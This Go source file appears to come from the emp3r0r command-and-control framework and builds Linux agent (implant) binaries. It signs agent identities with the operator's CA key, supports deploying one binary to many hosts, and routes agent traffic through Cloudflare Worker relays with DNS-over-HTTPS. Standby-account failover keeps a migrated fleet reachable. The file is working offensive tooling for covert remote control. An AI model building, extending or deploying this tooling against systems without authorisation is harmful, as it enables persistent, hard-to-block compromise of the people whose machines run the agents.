package main

import (
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

func main() {
	// Setup paths like the real C2 server does
	homeDir, _ := os.UserHomeDir()
	prefix := filepath.Join(homeDir, ".local")
	live.Prefix = prefix
	live.EmpDataDir = filepath.Join(prefix, "lib", "emp3r0r")
	live.EmpBuildDir = filepath.Join(live.EmpDataDir, "build")
	live.EmpWorkSpace = filepath.Join(homeDir, ".emp3r0r")
	live.EmpConfigFile = filepath.Join(live.EmpWorkSpace, "emp3r0r.json")
	live.EmpConfigTar = filepath.Join("/tmp", "emp3r0r", "emp3r0r_operator_config.tar.gz")

	// Setup transport paths
	transport.CaCrtFile = filepath.Join(live.EmpWorkSpace, "ca-cert.pem")
	transport.CaKeyFile = filepath.Join(live.EmpWorkSpace, "ca-key.pem")
	transport.ServerCrtFile = filepath.Join(live.EmpWorkSpace, "server-cert.pem")
	transport.ServerKeyFile = filepath.Join(live.EmpWorkSpace, "server-key.pem")
	transport.OperatorCaCrtFile = filepath.Join(live.EmpWorkSpace, "operator-ca-cert.pem")
	transport.OperatorCaKeyFile = filepath.Join(live.EmpWorkSpace, "operator-ca-key.pem")
	transport.OperatorServerCrtFile = filepath.Join(live.EmpWorkSpace, "operator-server-cert.pem")
	transport.OperatorServerKeyFile = filepath.Join(live.EmpWorkSpace, "operator-server-key.pem")
	transport.OperatorClientCrtFile = filepath.Join(live.EmpWorkSpace, "operator-client-cert.pem")
	transport.OperatorClientKeyFile = filepath.Join(live.EmpWorkSpace, "operator-client-key.pem")

	fmt.Printf("WorkSpace: %s\n", live.EmpWorkSpace)
	fmt.Printf("Config file: %s\n", live.EmpConfigFile)

	// Read existing config
	jsonData, err := os.ReadFile(live.EmpConfigFile)
	if err != nil {
		fmt.Printf("Failed to read config: %v\n", err)
		os.Exit(1)
	}

	if err = config.ReadJSONConfig(jsonData, live.RuntimeConfig); err != nil {
		fmt.Printf("Failed to parse config: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("C2 Address: %s\n", live.RuntimeConfig.CCAddress)
	fmt.Printf("H2 Port: %s\n", live.RuntimeConfig.CCH2Port)

	// Generate UUID (or reuse one via --uuid for identity-continuous updates:
	// same UUID + same password → the new binary derives the same key-cache
	// KEK, decrypts the previous identity, and the CC's TOFU pin stays valid)
	agentUUID := uuid.NewString()
	if reused := os.Getenv("EMP_AGENT_UUID"); reused != "" {
		agentUUID = reused
		fmt.Printf("Reusing agent UUID from EMP_AGENT_UUID: %s\n", agentUUID)
	}
	fmt.Printf("Agent UUID: %s\n", agentUUID)

	// Sign UUID with CA private key
	caKeyData, err := os.ReadFile(transport.CaKeyFile)
	if err != nil {
		fmt.Printf("Failed to read CA key: %v\n", err)
		os.Exit(1)
	}

	block, _ := pem.Decode(caKeyData)
	if block == nil {
		fmt.Printf("Failed to parse CA key PEM\n")
		os.Exit(1)
	}

	caPrivateKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		fmt.Printf("Failed to parse EC private key: %v\n", err)
		os.Exit(1)
	}

	// Sign the agent UUID using ECDSA
	hash := sha256.Sum256([]byte(agentUUID))
	sig, err := ecdsa.SignASN1(rand.Reader, caPrivateKey, hash[:])
	if err != nil {
		fmt.Printf("Failed to sign agent UUID: %v\n", err)
		os.Exit(1)
	}

	agentUUIDSig := base64.URLEncoding.EncodeToString(sig)
	fmt.Printf("Agent UUID Sig: %s\n", agentUUIDSig)

	// Set default P2P transport
	p2pTransport := "mtls"
	live.RuntimeConfig.P2PTransport = p2pTransport

	// Build config
	opts := builder.AgentConfig{
		CCAddress:     &live.RuntimeConfig.CCAddress,
		C2ChannelMode: &live.RuntimeConfig.C2ChannelMode,
		IsP2PEnabled:  live.RuntimeConfig.IsP2PEnabled,
		IsDirectC2:    true,
		IsNCSIEnabled: live.RuntimeConfig.EnableNCSI,
		UseKCP:        live.RuntimeConfig.UseKCP,
		P2PTransport:  &p2pTransport,
		CCHTTPPort:    &live.RuntimeConfig.CCHTTPPort,
	}

	// --relay flag: build agent around rendezvous relay endpoints.
	// Args: --relay=<room>  (uses RelayURLs from emp3r0r.json, swapping role=cc -> role=agent)
	// NOTE: MakeConfig re-reads emp3r0r.json internally, clobbering RuntimeConfig,
	// so the relay override MUST be applied AFTER MakeConfig, before BuildAgent.
	relayMode := false
	relayRoom := ""
	// -o <path>: copy the assembled agent to this path after the build.
	// The build itself always lands in the workspace (timestamped name);
	// without -o handling operators could silently run stale copies.
	outCopy := ""
	multiHost := false
	for i := 0; i < len(os.Args[1:]); i++ {
		arg := os.Args[1:][i]
		if strings.HasPrefix(arg, "--relay=") {
			relayMode = true
			relayRoom = strings.TrimPrefix(arg, "--relay=")
		}
		if arg == "--multi-host" {
			// One binary, many hosts: the agent derives a fresh per-host UUID
			// on first run instead of using this build's UUID (which would
			// collide on the CC's TOFU pin when deployed to a second host).
			multiHost = true
		}
		if arg == "-o" && i+1 < len(os.Args[1:]) {
			outCopy = os.Args[1:][i+1]
			i++
		}
	}

	// Make config
	if err := builder.MakeConfig(opts); err != nil {
		fmt.Printf("Failed to make config: %v\n", err)
		os.Exit(1)
	}

	// Multi-host flag must be applied AFTER MakeConfig (it re-reads the JSON
	// config and clobbers RuntimeConfig).
	if multiHost {
		live.RuntimeConfig.MultiHost = true
		live.RuntimeConfig.AgentUUIDParent = agentUUID
		fmt.Printf("Multi-host mode: agents will derive per-host UUIDs (parent %s)\n", agentUUID)
	}

	// Apply relay override AFTER MakeConfig (which re-reads the JSON config)
	// Default (no --relay or --relay=same): agent joins the SAME rooms the CC
	// listens on — only the role is swapped. A custom --relay=<room> moves the
	// agent to a different room; it hangs unless a CC also listens there.
	if relayMode {
		agentURLs := []string{}
		for _, u := range live.RuntimeConfig.RelayURLs {
			a := strings.Replace(u, "role=cc", "role=agent", 1)
			if relayRoom != "" && relayRoom != "same" {
				if i := strings.Index(a, "/ws/"); i >= 0 {
					rest := a[i+4:]
					if j := strings.Index(rest, "?"); j >= 0 {
						a = a[:i+4] + relayRoom + rest[j:]
					}
				}
			}
			agentURLs = append(agentURLs, a)
		}
		if len(agentURLs) == 0 {
			fmt.Println("--relay set but emp3r0r.json has no relay_urls; add them first")
			os.Exit(1)
		}
		// Hot-migration failover targets: append every standby account's relay
		// domain (from cf_accounts.json) so a fleet moved to another CF account
		// stays reachable by the same agent build via the existing endpoint
		// rotation. Duplicates are dropped; the active relay stays first.
		agentURLs = appendStandbyRelayEndpoints(agentURLs, relayRoom)
		live.RuntimeConfig.RelayURLs = agentURLs
		live.RuntimeConfig.C2ChannelMode = "worker_ws"
		live.RuntimeConfig.CCAddress = agentURLs[0]
		// DNS must also survive relay-only networks: point DoH at the Worker's
		// /dns route (RFC 8484). ncruces/go-dns POSTs to the URI as-is, and the
		// Worker accepts the shared secret via ?secret= query param.
		if live.RuntimeConfig.DoHServer == "" {
			if u, err := url.Parse(agentURLs[0]); err == nil && u.Host != "" {
				secret := u.Query().Get("secret")
				if secret != "" {
					live.RuntimeConfig.DoHServer = fmt.Sprintf("https://%s/dns?secret=%s",
						u.Host, url.QueryEscape(secret))
				}
			}
		}
		fmt.Printf("Relay mode: room=%s, %d endpoints\n", relayRoom, len(agentURLs))
		for _, u := range agentURLs {
			fmt.Printf("  %s\n", maskSecret(u))
		}
	}

	// Build agent
	buildCfg := builder.AgentBuildConfig{
		PayloadType:  builder.PayloadTypeLinuxExecutable,
		Arch:         "amd64",
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: agentUUIDSig,
	}

	result, err := builder.BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		fmt.Printf("Failed to build agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\n✅ Agent built successfully!\n")
	fmt.Printf("   Output: %s\n", result.OutputFile)
	fmt.Printf("   UUID: %s\n", result.AgentUUID)
	fmt.Printf("   Config size: %d bytes\n", result.ConfigSize)

	if outCopy != "" {
		data, err := os.ReadFile(result.OutputFile)
		if err != nil {
			fmt.Printf("Warning: read built agent: %v\n", err)
		} else if err := os.WriteFile(outCopy, data, 0o755); err != nil {
			fmt.Printf("Warning: -o %s: %v\n", outCopy, err)
		} else {
			fmt.Printf("   Copied to: %s\n", outCopy)
		}
	}
}

// maskSecret hides the secret query parameter in logs.
func maskSecret(url string) string {
	for i := 0; i+8 <= len(url); i++ {
		if url[i:i+8] == "&secret=" {
			return url[:i+8] + "***"
		}
	}
	return url
}


// appendStandbyRelayEndpoints appends wss endpoints for every standby CF
// account listed in cf_accounts.json (hot-migration fleet file). The agent's
// existing relay failover then covers a whole-fleet migration: dial the old
// domain, fail (route dropped / 409), rotate to the next embedded endpoint.
func appendStandbyRelayEndpoints(urls []string, relayRoom string) []string {
	secret := ""
	if len(urls) > 0 {
		if u, err := url.Parse(urls[0]); err == nil {
			secret = u.Query().Get("secret")
		}
	}
	if relayRoom == "" || relayRoom == "same" {
		if len(urls) > 0 {
			if u, err := url.Parse(urls[0]); err == nil {
				parts := strings.Split(strings.Trim(u.Path, "/"), "/")
				if len(parts) >= 2 {
					relayRoom = parts[1]
				}
			}
		}
	}
	if relayRoom == "" || secret == "" {
		return urls
	}

	type fleetFile struct {
		Accounts []struct {
			Domain string `json:"domain"`
		} `json:"accounts"`
	}
	fleetPath := filepath.Join(live.EmpWorkSpace, "cf_accounts.json")
	data, err := os.ReadFile(fleetPath)
	if err != nil {
		return urls
	}
	var fleet fleetFile
	if err := json.Unmarshal(data, &fleet); err != nil {
		return urls
	}

	seen := map[string]bool{}
	for _, u := range urls {
		if p, err := url.Parse(u); err == nil {
			seen[p.Host] = true
		}
	}
	for _, a := range fleet.Accounts {
		if a.Domain == "" {
			continue
		}
		host := "relay." + a.Domain
		if seen[host] {
			continue
		}
		seen[host] = true
		u := "wss://" + host + "/ws/" + relayRoom + "?role=agent&secret=" + url.QueryEscape(secret)
		urls = append(urls, u)
	}
	return urls
}
